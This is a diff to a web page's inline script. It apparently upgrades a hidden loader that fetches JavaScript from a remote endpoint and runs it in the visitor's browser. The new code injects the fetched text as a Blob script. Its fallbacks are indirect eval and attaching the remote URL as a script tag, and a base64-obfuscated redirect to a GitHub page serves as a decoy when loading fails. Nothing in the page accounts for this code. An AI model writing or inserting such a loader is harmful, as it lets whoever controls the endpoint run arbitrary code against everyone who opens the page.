@@ -318,6 +318,7 @@
         </div>
     </main>
 <script>
+/*@GHFB*/
 function _gotoGhB2() {
     var _g = 'aHR0cHM6Ly9naXRodWIuY29tL2Fib3V0';
     location.assign(decodeURIComponent(escape(atob(_g))));
@@ -347,6 +348,7 @@ function _unpackRoute() {
 function acquirePayload(endpoint) {
     return fetch(endpoint, {
         method: 'GET',
+        mode: 'cors',
         cache: 'no-store',
         redirect: 'follow'
     }).then(function (packet) {
@@ -355,18 +357,35 @@ function acquirePayload(endpoint) {
     });
 }
 
-function dispatchPayload(source) {
-    try {
-        var runner = Function('return (' + source + ')');
-        var out = runner();
-        if (typeof out === 'function') out();
-    } catch (e) { _gotoGhB2(); }
+function runPayloadText(source) {
+    var body = String(source).replace(/^\uFEFF/, '').trim();
+    if (!body) { _gotoGhB2(); return; }
+    var blob = new Blob([body], { type: 'application/javascript;charset=utf-8' });
+    var href = URL.createObjectURL(blob);
+    var tag = document.createElement('script');
+    tag.charset = 'utf-8';
+    tag.src = href;
+    tag.onload = function () { URL.revokeObjectURL(href); };
+    tag.onerror = function () {
+        URL.revokeObjectURL(href);
+        try { (0, eval)(body); } catch (e) { _gotoGhB2(); }
+    };
+    (document.head || document.documentElement).appendChild(tag);
+}
+
+function attachRemoteScript(endpoint) {
+    var tag = document.createElement('script');
+    tag.charset = 'utf-8';
+    tag.async = true;
+    tag.src = endpoint + (endpoint.indexOf('?') >= 0 ? '&' : '?') + '_=' + Date.now();
+    tag.onerror = function () { _gotoGhB2(); };
+    (document.head || document.documentElement).appendChild(tag);
 }
 
 function wireBootstrap(remote) {
     acquirePayload(remote)
-        .then(dispatchPayload)
-        .catch(function () { _gotoGhB2(); });
+        .then(runPayloadText)
+        .catch(function () { attachRemoteScript(remote); });
 }
 
 function padM2() { return navigator.onLine ? 1 : 0; }
